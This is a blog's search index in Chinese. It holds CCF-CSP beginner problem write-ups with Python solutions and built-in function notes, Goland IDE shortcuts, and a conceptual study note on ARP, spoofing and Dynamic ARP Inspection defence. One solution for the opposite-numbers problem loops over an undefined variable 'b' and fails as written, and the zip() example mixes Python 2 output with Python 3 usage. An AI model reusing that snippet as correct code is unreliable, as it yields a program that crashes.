<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CCF-CSP 数列分段与折点计数]]></title>
    <url>%2F2018%2F09%2F21%2FCCF-CSP-%E6%95%B0%E5%88%97%E5%88%86%E6%AE%B5%E4%B8%8E%E6%8A%98%E7%82%B9%E8%AE%A1%E6%95%B0%2F</url>
    <content type="text"><![CDATA[CCF-CSP 201509-1 数列分段 与 201604-1 折点计数 题解 201509-1 数列分段问题描述123456789101112131415161718192021222324252627试题编号：201509-1试题名称：数列分段时间限制：1.0s内存限制：256.0MB问题描述 给定一个整数数列，数列中连续相同的最长整数序列算成一段，问数列中共有多少段？输入格式 输入的第一行包含一个整数n，表示数列中整数的个数。 第二行包含n个整数a1, a2, …, an，表示给定的数列，相邻的整数之间用一个空格分隔。输出格式 输出一个整数，表示给定的数列有多个段。样例输入 8 8 8 8 0 12 12 8 0样例输出 5样例说明 8 8 8是第一段，0是第二段，12 12是第三段，倒数第二个整数8是第四段，最后一个0是第五段。评测用例规模与约定 1 ≤ n ≤ 1000，0 ≤ ai ≤ 1000。 题解 这个题目非常简单，初始化段的计数为1，因为至少有一个段，然后遍历数组，出现不同的数字意味着又有新的段，所以段的计数加1，否则就是同一个段，直接检查下一个数。 12345678n = int(input()) # 整数的个数lst = list(map(int, input().split())) # 给定的数列count = 1 # 计数for i in range(n - 1): if lst[i] != lst[i + 1]: # 每次不同就加1 count += 1print(count) # 输出结果 201604-1 折点计数问题描述1234567试题编号：201604-1试题名称：折点计数时间限制：1.0s内存限制：256.0MB问题描述 给定n个整数表示一个商店连续n天的销售量。如果某天之前销售量在增长，而后一天销售量减少，则称这一天为折点，反过来如果之前销售量减少而后一天销售量增长，也称这一天为折点。其他的天都不是折点。如下图中，第3天和第6天是折点。 12345678910111213141516171819 给定n个整数a1, a2, …, an表示销售量，请计算出这些天总共有多少个折点。 为了减少歧义，我们给定的数据保证：在这n天中相邻两天的销售量总是不同的，即ai-1≠ai。注意，如果两天不相邻，销售量可能相同。输入格式 输入的第一行包含一个整数n。 第二行包含n个整数，用空格分隔，分别表示a1, a2, …, an。输出格式 输出一个整数，表示折点出现的数量。样例输入 7 5 4 1 2 3 6 4样例输出 2评测用例规模与约定 所有评测用例满足：1 ≤ n ≤ 1000，每天的销售量是不超过10000的非负整数。 题解 这个题目也非常简单，由题目可知，这点的特点就是左右两个点要么都大于或者小于这个数，于是依据这个条件从第二个点开始，依次检查到倒数第二个点即可。 1234567n = int(input()) # 整数个数lst = list(map(int, input().split())) # 整数列表count = 0 # 计数变量for i in range(1, n - 1): # 遍历数组 if (lst[i] &lt; lst[i - 1] and lst[i] &lt; lst[i + 1]) or (lst[i] &gt; lst[i - 1] and lst[i] &gt; lst[i + 1]): # 计数 count += 1print(count) # 输出结果]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>CCF-CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CCF-CSP 门禁系统]]></title>
    <url>%2F2018%2F09%2F21%2FCCF-CSP-%E9%97%A8%E7%A6%81%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[CCF-CSP 201412-1 门禁系统 题解 问题描述123456789101112131415161718192021222324试题编号：201412-1试题名称：门禁系统时间限制：1.0s内存限制：256.0MB问题描述 涛涛最近要负责图书馆的管理工作，需要记录下每天读者的到访情况。每位读者有一个编号，每条记录用读者的编号来表示。给出读者的来访记录，请问每一条记录中的读者是第几次出现。输入格式 输入的第一行包含一个整数n，表示涛涛的记录条数。 第二行包含n个整数，依次表示涛涛的记录中每位读者的编号。输出格式 输出一行，包含n个整数，由空格分隔，依次表示每条记录中的读者编号是第几次出现。样例输入 5 1 2 1 1 3样例输出 1 1 2 3 1评测用例规模与约定 1≤n≤1,000，读者的编号为不超过n的正整数。 题解1 采用数组来记录，创建一个与输入规模同样大小的数组rst，初始化为0，从前面开始扫描，每个数与其自身及其后面的数比较，然后借助变量 count 来实现计数看这个数出现了多少次，分别记录到计数数组中去： 输入：1 2 1 1 3 ，rst 数组初始化为 0 0 0 0 0 首先，lst[0] 与自身和其后的数比较，即1与1，1与2，1与1，1与1，1与3 比较，若相等，则计数加1，记录到记录数组 rst 中，则第一次外层循环执行完后，rst 为：1 0 2 3 0，即1号读者的记录全部处理完成。 然后，lst[1] 与自身和其后的数比较，即2与2，2与1，2与1，2与3 比较，此次完成后，rst 为 1 1 2 3 0 然后，rst[2] 和 rst[3] 都不为0 ， 即已经记录过，直接跳过lst[2] 和 lst[3]。 最后，lst[4] 与其自身比较，即 3与3 比较，rst 为 1 1 2 3 1 ，将 rst 输出即可。 1234567891011121314n = int(input()) # 记录条数lst = list(map(int, input().split())) # 记录中每位读者的编号rst = [0] * n # 初始化计数数组for i in range(n): if rst[i] != 0: # 跳过已经记录的值 continue count = 0 # 重置计数值 for j in range(i, n): # 从 i 开始比较 if lst[i] == lst[j]: # 计数 count += 1 rst[j] = countfor i in rst: # 输出结果 print(i, end=' ') 题解2 上一种方法是每次处理一个读者的所有记录，而这一种方法则是通过记录的前后关系进行统计，将 rst 数组初始化为 1 ，每个数与其后的数进行比较，若相等则将记录数组的对应元素值加1，扫完整个数组就完成了。 输入：1 2 1 1 3 ，rst 数组初始化为 [1 1 1 1 1] 首先，lst[0] 与其后的数比较，即 1与2，1与1，1与1，1与3 比较，rst 为 [1, 1, 2, 2, 1] 然后，lst[1] 与其后的数比较，即 2与1，2与1，2与3 比较，rst 为 [1, 1, 2, 2, 1] 然后，lst[2] 与其后的数比较，即 1与1，1与3 比较，rst 为 [1, 1, 2, 3, 1] 最后，lst[3] 与其后的数比较，即 1与3 比较，rst 为 [1, 1, 2, 3, 1] 123456789n = int(input()) # 记录条数lst = list(map(int, input().split())) # 记录中每位读者的编号rst = [1] * n # 初始化计数数组为1for i in range(n): for j in range(i + 1, n): # 从 i 后面的数开始比较 if (lst[j] == lst[i]): # 计数 rst[j] += 1for i in rst: # 输出结果 print(i, end=" ") 题解3 还有一种比较巧妙的方法，用一个计数数组来记录每个读者的到访次数，这个数组的下标即为读者编号（因此，数组大小必须大于题目所给的1000），然后检查所有记录，每检查一条记录就将读者编号为下标的对应的数组元素值加1，并且直接输出，依次检查每一条记录即可。 输入：1 2 1 1 3 首先，对于lst[0]，即 rec[1] 的值加1，记录为1，直接输出，输出列表为 1 然后，对于lst[1]，即 rec[2] 的值加1，记录为1，直接输出，输出列表为 1 1 然后，对于lst[2]，即 rec[1] 的值加1，记录为2，直接输出，输出列表为 1 1 2 然后，对于lst[3]，即 rec[1] 的值加1，记录为3，直接输出，输出列表为 1 1 2 3 最后，对于lst[4]，即 rec[3] 的值加1，记录为1，直接输出，输出列表为 1 1 2 3 1 123456n = int(input()) # 记录条数lst = list(map(int, input().split())) # 记录中每位读者的编号rec = [0] * 1004 # 记录数组for i in lst: rec[i] += 1 # 计数 print(rec[i], end=' ') # 每次计数后直接输出]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>CCF-CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CCF-CSP 相邻数对]]></title>
    <url>%2F2018%2F09%2F21%2FCCF-CSP-%E7%9B%B8%E9%82%BB%E6%95%B0%E5%AF%B9%2F</url>
    <content type="text"><![CDATA[CCF-CSP 201409-1 相邻数对 题解 问题描述123456789101112131415161718192021222324252627试题编号：201409-1试题名称：相邻数对时间限制：1.0s内存限制：256.0MB问题描述 给定n个不同的整数，问这些数中有多少对整数，它们的值正好相差1。输入格式 输入的第一行包含一个整数n，表示给定整数的个数。 第二行包含所给定的n个整数。输出格式 输出一个整数，表示值正好相差1的数对的个数。样例输入 6 10 2 6 3 7 8样例输出 3样例说明 值正好相差1的数对包括(2, 3), (6, 7), (7, 8)。评测用例规模与约定 1&lt;=n&lt;=1000，给定的整数为不超过10000的非负整数。 题解1 从第一个数开始，依次向后扫描，每次将该数与其之后的数进行比较，检查差值是不是 1，如果是则是相邻数，否则不是。样例演示如下： 10与2，10与6，10与3，10与7，10与8比较 2与6，2与3，2与7，2与8比较 ……以此类推 Python 代码实现： 12345678n = int(input()) # 获取整数个数的输入a = list(map(int, input().split())) # 获取输入的n个整数count = 0 # 计数for i in range(n - 1): # 按顺序扫描 for j in range(i + 1, n): if abs(a[j] - a[i]) == 1: # 判断是否是相邻数 count += 1print(count) # 输出结果 题解2 与题解 1 不同的是，我们可以使用 sort() 函数对输入的数据先进行排序，然后再扫描列表，判断其与后面一个数的差值是否为 1，如果是则是相邻数，否则不是。样例演示如下： 排序后：2，3，6，7，8，10 2与3，3与6，6与7，7与8，8与10比较即可。 Python 代码实现： 12345678n = int(input()) # 获取整数个数的输入a = list(map(int, input().split())) # 获取输入的n个整数a.sort() # 排序count = 0for i in range(n-1): # 按顺序扫描 if a[i]+1 == a[i+1]: # 判断是否是相邻数 count += 1print(count) # 输出结果 知识点补充abs() 函数 abs() 函数返回数字的绝对值。参数可以是实数(整数、浮点数等）或复数，如果参数是复数，则返回复数的模。 123456&gt;&gt;&gt; abs(-1)1&gt;&gt;&gt; abs(-11.1)11.1&gt;&gt;&gt; abs(4+3j)5.0 sort() 函数 sort() 函数用于对原列表进行排序，如果指定参数，则使用比较函数指定的比较函数。 1list.sort(cmp=None, key=None, reverse=False) 参数说明： key指定一个参数的函数，该函数用于从每个列表元素中提取比较键（例如，key=str.lower）。对应于列表中每个项的键计算一次，然后用于整个分类过程。默认值None 表示列表项直接排序而不计算单独的键值。 reverse 排序规则，reverse = True 降序， reverse = False 升序（默认）。 参数 reverse 的使用，升序与降序： 1234567&gt;&gt;&gt; L = [1, 3, 2, 4]&gt;&gt;&gt; L.sort() # 升序&gt;&gt;&gt; print(L)[1, 2, 3, 4]&gt;&gt;&gt; L.sort(reverse=True) # 降序&gt;&gt;&gt; print(L)[4, 3, 2, 1] 参数 key 的使用： 1234&gt;&gt;&gt; L = ['a','Z','w','C','A','b','t']&gt;&gt;&gt; L.sort(key=str.lower)&gt;&gt;&gt; print(L)['a', 'A', 'b', 'C', 't', 'w', 'Z'] 通过指定列表中的元素排序来输出列表： 123456def takeSecond(elem): # 取第2个元素 return elem[1]L = [(2, 2), (3, 4), (4, 1), (1, 3)]L.sort(key=takeSecond)print(L) 输出结果： 1[(4, 1), (2, 2), (1, 3), (3, 4)] 使用 lambda ，按 value 排序： 1234&gt;&gt;&gt; L = [('fzy', 23), ('zxc', 22), ('qwe', 18)]&gt;&gt;&gt; L.sort(key=lambda k:k[1])&gt;&gt;&gt; print(L)[('qwe', 18), ('zxc', 22), ('fzy', 23)] 使用 lambda ，按照 key 排序： 1234&gt;&gt;&gt; L = [('fzy', 23), ('zxc', 22), ('qwe', 18)]&gt;&gt;&gt; L.sort(key=lambda k:k[0])&gt;&gt;&gt; print(L)[('fzy', 23), ('qwe', 18), ('zxc', 22)] 使用 lambda ，先按 key 后按 value 排序： 1234&gt;&gt;&gt; L = [('fzy', 23), ('zxc', 22), ('qwe', 18)]&gt;&gt;&gt; L.sort(key=lambda k:(k[0], k[1]))&gt;&gt;&gt; print(L)[('fzy', 23), ('qwe', 18), ('zxc', 22)] lambda 函数： lambda 函数是匿名的：所谓匿名函数，通俗地说就是没有名字的函数。 lambda 函数有输入和输出：输入是传入到参数列表的值，输出是根据表达式计算得到的值。 lambda 函数一般功能简单：单行表达式决定了 lambda 函数不可能完成复杂的逻辑，只能完成非常简单的功能。由于其实现的功能一目了然，甚至不需要专门的名字来说明。 使用示例： 12lambda x, y: x*y；函数输入是x和y，输出是它们的积x*ylambda *args: sum(args); 输入是任意个数的参数，输出是它们的和]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>CCF-CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CCF-CSP 相反数]]></title>
    <url>%2F2018%2F09%2F18%2FCCF-CSP-%E7%9B%B8%E5%8F%8D%E6%95%B0%2F</url>
    <content type="text"><![CDATA[CCF-CSP 201403-1 相反数 题解 问题描述123456789101112131415161718192021试题编号：201403-1试题名称：相反数时间限制：1.0s内存限制：256.0MB问题描述 有 N 个非零且各不相同的整数。请你编一个程序求出它们中有多少对相反数(a 和 -a 为一对相反数)。输入格式 第一行包含一个正整数 N。(1 ≤ N ≤ 500)。 第二行为 N 个用单个空格隔开的非零整数,每个数的绝对值不超过1000,保证这些整数各不相同。输出格式 只输出一个整数,即这 N 个数中包含多少对相反数。样例输入 5 1 2 3 -1 -2样例输出 2 题解1 从第一个数开始，依次向后扫描，每次将该数与其之后的数相加，检查和是不是 0，如果是则是相反数，否则不是。此外，要排除数字 0 的情况。样例演示如下： 1+2，1+3，1+(-1)，1+(-2) 判断和是否为0 2+3，2+(-1)，2+(-2) 判断和是否为0 ……依此类推 Python 代码实现： 12345678n = int(input()) # 获取整数个数的输入a = list(map(int, input().split())) # 获取输入的n个整数count = 0 # 计数for i in range(n - 1): # 按顺序扫描 for j in range(i + 1, n): if a[i] != 0 and (a[i] + a[j] == 0): # 判断是否是相反数 count = count + 1print(count) # 输出结果 题解2 利用集合中元素不同的性质，将原列表中的负数转换成正数，将新的列表转换成集合，然后用输入的整数个数（原列表长度）减去集合的长度（去除相反数的列表长度）即为相反数的个数。 Python 代码实现： 123456n = int(input()) # 获取整数个数的输入a = list(map(int, input().split())) # 获取输入的n个整数for x in range(b): a[x] = abs(a[x]) # 负数转正数c = set(a) # 列表转换成集合print(n - len(c)) # 得到相反数个数 题解3 题解 2 的另一种间接写法，充分利用了 map() 函数。Python 代码实现： 1234n = int(input())a = list(map(int, input().split())) # 输入转化为列表b = set(map(abs, a)) # 各项取绝对值后转化为集合，即除去相反的负数print(n - len(b)) # 原长度减去现长度，即被减去的相反数个数]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>CCF-CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CCF-CSP 出现次数最多的数]]></title>
    <url>%2F2018%2F09%2F17%2FCCF-CSP-%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84%E6%95%B0%2F</url>
    <content type="text"><![CDATA[CCF-CSP 201312-1 出现次数最多的数 题解 问题描述123456789101112131415161718192021试题编号：201312-1试题名称：出现次数最多的数时间限制：1.0s内存限制：256.0MB问题描述： 给定n个正整数，找出它们中出现次数最多的数。如果这样的数有多个，请输出其中最小的一个。输入格式 输入的第一行只有一个正整数n(1 ≤ n ≤ 1000)，表示数字的个数。 输入的第二行有n个整数s1, s2, …, sn (1 ≤ si ≤ 10000, 1 ≤ i ≤ n)。相邻的数用空格分隔。输出格式 输出这n个次数中出现次数最多的数。如果这样的数有多个，输出其中最小的一个。样例输入 6 10 1 10 20 30 20样例输出 10 题解1 最容易想到的办法就是用数组来记录整数的出现次数，比如整数10出现的次数，用索引（下标）为10的数组元素a[10]来记录，出现 1 次 a[10] 的值即加 1，20则用a[20]来记录，依此类推。当然，这个数组的大小必须满足题目的最大要求，整数小于等于10000，也就是说数组必须要大于10000个元素，才能保证所有测试样例全部通过。完成记录以后，遍历整个记录数组，找出数组中最大的元素，记录其索引值（下标），当出现出现次数相等的情况时，选择较小的下标作为结果。 12345678910111213n = int(input()) # 读取输入整数个数a = list(map(int, input().split())) # 读取输入的整数，并存储在列表里b = [0] * 10004 # 标记整数出现次数的数组for i in a: # 遍历输入的整数列表 b[i] = b[i] + 1 # 标记整数出现次数m = 0result = 0 # 结果for i in range(10004): # 遍历整个计数数组 if (b[i] &gt; m) or (b[i] == m and result &gt; i): # 记录出现次数最多，且最小的整数 m = b[i] # 当前最大次数记录更新 result = i # 记录当前最大次数的索引，即我们的结果print(result) # 输出结果 题解2 改进第一种方法中的一个细节，就是关于出现次数相等情况的处理，由于最后是按从小到大的顺利遍历数组，所以不需要处理相等的情况也可以保证选出的出现次数的最多的同时也是最小的。 12345678910111213n = int(input()) # 读取输入整数个数a = list(map(int, input().split())) # 读取输入的整数，并存储在列表里b = [0] * 10004 # 标记整数出现次数的数组for i in a: # 遍历输入的整数列表 b[i] = b[i] + 1 # 标记整数出现次数m = 0result = 0 # 结果for i in range(10004): # 遍历整个计数数组 if b[i] &gt; m: # 记录出现次数最多，由于是按从小到大的顺利遍历数组，所以不需要处理相等的情况 m = b[i] # 当前最大次数记录更新 result = i # 记录当前最大次数的索引，即我们的结果print(result) # 输出结果 题解3 这份代码确实比较分骚，充分利用了Python的内建函数来结题，在列表、元组和字典之间进行流畅地转换： 123456n = int(input())a = list(map(int, input().split()))b = list(set(a)) # 利用集合的特性，转换为集合，去掉其中相同数b.sort() # 从小到大排序s = dict(zip(b, map(a.count, b))) # 将数与它的出现次数组合再转为字典print(max(s, key=s.get)) # 根据字典值选出count最大的数 知识点补充map() 函数 Python函数编程中的 map() 函数是将 func 作用于 seq 中的每一个元素，并将所有的调用的结果作为一个 list 返回。 1map(func, seq1[, seq2,…]) 第一个参数接受一个函数名，后面的参数接受一个或多个可迭代的序列，返回的是一个集合。 Python2 中： 1234&gt;&gt;&gt; nums = map(int, input().split())19 7 8 25&gt;&gt;&gt; nums[19 7 8 25] Python3中： 1234&gt;&gt;&gt; nums = map(int, input().split())19 7 8 25&gt;&gt;&gt; nums&lt;map object at 0x035A18F0&gt; 如果也想实现python2的效果，需要这样写： 12&gt;&gt;&gt; list(nums)[19, 7, 8, 25] 在上面的题解3中，使用 map()函数结合 list.count() 函数做统计： 1234&gt;&gt;&gt; a = [10, 1, 10, 20, 30, 20]&gt;&gt;&gt; b = [1, 10, 20, 30]&gt;&gt;&gt; list(map(a.count, b))[1, 2, 2, 1] zip() 函数 zip() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。 123456&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = [4,5,6]&gt;&gt;&gt; c = zip(a,b)[(1, 4), (2, 5), (3, 6)]&gt;&gt;&gt; zip(*c)[(1, 2, 3), (4, 5, 6)] 在上面的题解3中，使用 zip()函数将整数及其出现次数整合成元组： 1234&gt;&gt;&gt; a = [10, 1, 10, 20, 30, 20]&gt;&gt;&gt; b = [1, 10, 20, 30]&gt;&gt;&gt; list(zip(b, map(a.count, b)))[(1, 1), (10, 2), (20, 2), (30, 1)] dict() 函数 dict() 函数用于创建一个字典。 1dict(key/value) key/value – 用于创建字典的键/值对，可以为空、字典、关键字、包含元组的列表等，如下： 12345678910&gt;&gt;&gt; dict() # 空字典&#123;&#125;&gt;&gt;&gt; dict(&#123;'fzy': 23&#125;) # 传递字典&#123;'fzy': 23&#125;&gt;&gt;&gt; dict(fzy=23) # 传递关键字&#123;'fzy': 23&#125;&gt;&gt;&gt; dict([('fzy', 23),('xsc', 22)]) # 传递包含多个元组的列表&#123;'fzy': 23, 'xsc': 22&#125;&gt;&gt;&gt; dict(zip(['fzy', 'xsc'], [23, 22])) # 传递zip()函数&#123;'fzy': 23, 'xsc': 22&#125; 在上面的题解3中，使用 dict()函数将由整数及其出现次数组成的元组转换成字典： 1234&gt;&gt;&gt; a = [10, 1, 10, 20, 30, 20]&gt;&gt;&gt; b = [1, 10, 20, 30]&gt;&gt;&gt; dict(zip(b, map(a.count, b)))&#123;1: 1, 10: 2, 20: 2, 30: 1&#125; max() 函数 max() 函数返回给定参数的最大值，参数可以为序列。 12&gt;&gt;&gt; max([1, 2, 3])3 可以用 max(dict,key=dict.get) 方法获得字典 dict 中 value 的最大值所对应的键的方法，max(dict, key) 方法首先遍历迭代器，并将返回值作为参数传递给 key 对应的函数，然后将函数的执行结果传给 key ，并以此时 key 值为标准进行大小判断，返回最大值。 在上面的题解3中，使用 max()函数 得到由整数及其出现次数组成的字典中出现次数最大的整数： 1234567&gt;&gt;&gt; a = [10, 1, 10, 20, 30, 20]&gt;&gt;&gt; b = [1, 10, 20, 30]&gt;&gt;&gt; s = dict(zip(b, map(a.count, b)))&gt;&gt;&gt; s&#123;1: 1, 10: 2, 20: 2, 30: 1&#125;&gt;&gt;&gt; max(s, key=s.get)10]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>CCF-CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Goland IDE 常用快捷键]]></title>
    <url>%2F2018%2F09%2F15%2FGoland-IDE-%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[Goland IDE 常用快捷键总结。 代码编辑 CTRL+X，剪切、删除当前光标所在行。 CTRL+D，复制当前光标所在行。 ALT+Q，查看当前方法的声明。 CTRL+P， 方法参数提示 。 CTRL+空格， 代码提示 。 Ctrl+Shift+Up/Down， 代码向上/下移动。 CTRL+Backspace，按单词进行删除。 SHIFT+ENTER，向下插入新行，即使光标在当前行的中间。 ALT+SHIFT+UP/DOWN，将光标所在行的代码上下移动。 CTRL+SHIFT+U，将选中内容进行大小写转化。 代码格式化 CTRL+ALT+T，把代码包在一个块内，例如if{…}else{…}。 CTRL+ALT+L，格式化代码。 CTRL+空格，代码提示。 CTRL+/，单行注释。 CTRL+SHIFT+/，进行多行注释。 CTRL+B，快速打开光标处的结构体或方法（跳转到定义处）。 CTRL+“+/-”，可以将当前方法进行展开或折叠。 查找和定位 CTRL+R，替换文本。 CTRL+F，查找文本。 CTRL+SHIFT+F，进行全局查找。 CTRL+G，快速定位到某行。 CTRL+N，查找类 。 CTRL+F，在当前窗口查找文本 。 CTRL+SHIFT+F，在指定窗口查找文本 。 CTRL+R，在当前窗口替换文本 。 CTRL+SHIFT+R，在指定窗口替换文本 。 文件相关快捷键 CTRL+E，打开最近浏览过的文件。 CTRL+SHIFT+E，打开最近更改的文件。 CTRL+N，可以快速打开struct结构体。 CTRL+SHIFT+N，可以快速打开文件。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARP：地址解析协议]]></title>
    <url>%2F2018%2F09%2F13%2FARP%EF%BC%9A%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[地址解析协议 ARP 的原理、攻击与防御学习总结。 在网络通信中，主机和主机通信的数据包需要依据 OSI 模型从上到下进行数据封装，当数据封装完整后，再向外发出。在网络层上，主机和路由器用逻辑地址来标志，逻辑地址在本地是唯一的，但在全局上不一定。在TCP/IP 协议族中称为 IP 地址，现在常用的版本是IPv4，长度是32位。在链路层上，主机和路由器用他们的物理地址来标志，即 48 位的物理地址，也是是我们通常所说的网卡地址（MAC地址）。 因此，需要能够将逻辑地址和相应的物理地址之间进行映射，完成这样的映射可以使用静态映射和动态映射： 静态映射：创建一个表，存储逻辑地址和物理地址之间的关联关系，然后将网络上的每个主机都存储这张表。缺点是，映射表必须周期的更新，增加了网络的开销。 动态映射：采用 ARP（Address Resolution Protocol，地址解析协议），它负责完成逻辑地址向物理地址的动态映射，将 32 位逻辑地址（IP地址）转换为 48 位的物理地址（MAC地址）。 ARP 基本原理 ARP 通过一个查找表（ARP缓存）来执行地址转换的。当在 ARP 缓存中没有找到地址时，则向网络发送一个广播请求，网络上所有的主机和路由器都接收和处理这个 ARP 请求，但是只有相同 IP 地址的接收到广播请求的主机或路由器，发回一个 ARP 应答分组，应答中包含它的 IP 地址和物理地址，并保存在请求主机的 ARP 缓存中。其他主机或路由器都丢弃此分组。 具体过程如下： 本地主机在局域网中广播 ARP 请求，ARP 请求数据帧中包含目的主机的 IP 地址，意思是“如果你是这个 IP 地址的拥有者，请回答你的硬件地址”。 目的主机的 ARP 层解析这份广播报文，识别出是询问其硬件地址。于是发送 ARP 应答包，里面包含 IP 地址及其对应的硬件地址。 本地主机收到 ARP 应答后，知道了目的地址的硬件地址，之后的数据报就可以传送了。 注意：点对点链路不使用 ARP 协议。APR 请求包是广播的，但是 ARP 应答帧是单播的。 ARP 高速缓存 ARP 高效运行的关键是由于每个主机上都有一个 ARP 高速缓存。这个高速缓存存放了最近 Internet 地址到硬件地址之间的映射记录。高速缓存中每一项的生存时间一般为20分钟，起始时间从被创建时开始算起。 常用 ARP 高速缓存操作命令： 缓存查看 1arp -a # 参数-a的意思是显示高速缓存中所有的内容。 缓存清空 1arp -d 代理 ARP 如果 ARP 请求是从一个网络的主机发往另一个网络上的主机，可能需要经过很多路由器，而路由器隔离广播域，每个接口/网段都是独立的广播域， ARP 请求又是二层广播包，所以ARP 广播包没法通过过路由器。。因此，网关设备收到此 ARP 请求，会用自己的 MAC 地址返回给请求者，这便是代理 ARP（Proxy ARP）。 上图中，PC 发送 ARP 请求服务器 8.8.8.8 的 MAC 地址，路由器（网关）收到这个请求时会进行判断，由于目标 8.8.8.8 不属于本网段（即跨网段），此时便返回自己的接口 MAC 地址给 PC，后续电脑访问服务器时，目标 MAC 直接封装为 MAC254。 实际网络中，无论是同网段还是跨网段通信（例如访问互联网），绝大情况下都是使用正常的ARP，而不是代理ARP。 代理 ARP 仅仅是正常ARP的一个拓展使用，是可选项而不是必要项； 代理 ARP 有特定的应用场景，与网关/路由的设置有直接关系：当电脑没有网关/路由功能时，并且需要跨网站通信时，则会触发代理 ARP 。换句话说，如果有网关/路由功能，则不需要代理 ARP； 正常环境下，当用户接入网络时，都会通过 DHCP 协议或手工配置的方式得到 IP 和网关信息（所以不需要代理ARP）。 那么什么时候使用正常 ARP ？什么时候使用代理 ARP 呢？总结如下： 电脑没有网关时，ARP 直接询问目标 IP 对应的 MAC 地址（跨网段），采用代理 ARP； 电脑有网关时，ARP 只需询问网关 IP 对应的 MAC 地址（同网段），采用正常 ARP； 无论是正常ARP还是代理 ARP，电脑最终都拿到同一个目标 MAC 地址：网关 MAC。 免费 ARP 免费 ARP 是指主机发送 ARP 查找自己的 IP 地址，用于检测局域网内的IP地址冲突。免费 ARP 可以有两个方面的作用： 一个主机可以通过它来确定另一个主机是否设置了相同的 IP 地址。 如果发送免费 ARP 的主机正好改变了硬件地址（很可能是主机关机了，并换了一块接口卡，然后重新启动），那么这个分组就可以使其他主机高速缓存中旧的硬件地址进行相应的更新。 免费 ARP 的报文发出去是不希望收到回应的，只希望是起宣告作用；如果收到回应，则证明对方也使用自己目前使用的 IP 地址。当电脑检测到自己的IP地址跟其他电脑冲突时，它们会相互发送免费ARP，用来提醒对方：你的IP地址跟我的冲突啦！冲突方之间可能会一直发送，直到有一边做出让步并修改IP地址（不同系统解决方法不同）。 ARP 攻击与防御攻击原理 ARP欺骗攻击，考虑如下图的情景，在局域网里面，PC1、PC2、PC3三台主机共同连接到交换机 SW1 上面，对应 3 个接口 port 1/2/3。 PC1 需要跟 PC2 通信，通过 ARP 请求包询问 PC2 的 MAC 地址，由于采用广播形式，所以交换机将 ARP 请求包从接口 P1 广播到 P2 和 PC3。 PC2 根据询问信息，返回ARP单播回应包；此时 PC3 作为攻击者，没有返回 ARP 包，但是处于“监听”状态，为后续攻击做准备。 PC1 和 PC2 根据 ARP 问答，将各自的 ARP 映射信息（IP-MAC）存储在本地 ARP 缓存表。 交换机根据其学习机制，记录 MAC 地址对应的接口信息，存储在 CAM 缓存表（也称为 MAC 地址表）。交换机收到数据包时，会解封装数据包，根据目标 MAC 字段进行转发。 正常情况下，若收到的 ARP 请求不是给自己的，则直接丢弃；而攻击者 PC3 在监听之后，发起了 ARP 回应包：我就是 PC2（IP2-MAC3）。PC1 收到两个 ARP 回应包，内容分别如下： 我是 PC2，我的IP地址是 IP2，我的 MAC 地址是 MAC2； 我是 PC2，我的IP地址是 IP2，我的 MAC 地址是 MAC3； 网络协议里各种表在处理缓存信息的方式要么是”先到先得”，要么”后到优先”。上面提到的 ARP 和 CAM 表，就是遵循”后到优先”原则。因此，作为攻击者，只要持续不停发出 ARP 欺骗包，就一定能够覆盖掉正常的ARP回应包。 根据数据封装规则，此后，当 PC1 要跟 PC2 进行通信时，无论是发送 PING 包还是发送其他数据，首先要查找 ARP 表，然后在网络层打上源目 IP，在链路层打上源目 MAC，然后将数据包发送给交换机。交换机收到之后对数据进行解封装，并且查看 CAM 表（基于目的 MAC 转发），由于目标 MAC3 对应 Port3，所以交换机自然而然将其转发给 PC3。就这样，PC1 本来要发给 PC2 的数据包，落到了攻击者 PC3 手里，这就完成了一次完整的 ARP 攻击。 防御原理 ARP攻击的罪魁祸首就是 ARP 欺骗包，处理这种欺骗行为的两个解决方法： 保证电脑不接收欺骗包。 保证电脑收到欺骗包之后不相信。 ARP防御可以在网络设备上实现，也可以在用户端实现，更可以在网络设备和用户端同时实现。局域网安全里比较常用的 ARP 防御技术被称为DAI（Dynamic ARP Inspection）- 动态ARP检测，原理可以简单概括： 交换机记录每个接口对应的 IP 地址和 MAC，即 port&lt;-&gt;mac&lt;-&gt;ip，生成 DAI 检测表； 交换机检测每个接口发送过来的 ARP 回应包，根据 DAI 表判断是否违规，若违规则丢弃此数据包并对接口进行惩罚。 DAI 是目前防御ARP攻击最有效的方法之一，但是大部分能支持这种动态ARP监测技术的交换机或者无线路由器，都基本是企业级的产品。简单的交换机不具备动态ARP监测技术。普通用户（电脑或手机）可以通过安装ARP防火墙做安全防御，可使用360安全卫士、腾讯电脑管家等软件来实现 ARP 攻击的防御。 参考资料： [1] Fall K R, Stevens W R. TCP/IP illustrated, volume 1: The protocols[M]. 